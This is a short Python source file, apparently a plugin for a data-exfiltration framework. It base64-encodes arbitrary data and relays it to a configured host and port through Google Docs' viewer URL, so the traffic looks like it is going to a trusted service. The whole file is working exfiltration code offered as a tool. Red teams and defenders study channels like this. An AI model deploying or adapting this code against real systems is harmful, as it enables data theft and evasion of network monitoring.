import requests
import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib

config = None
app_exfiltrate = None


def send(data):
    target = "https://docs.google.com/viewer?url=http://{}:{}/{}".format(config['target'], config['port'], urllib.quote_plus(base64.b64encode(data)))
    app_exfiltrate.log_message(
        'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
    requests.get(target)


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('google_docs', {'send': send})
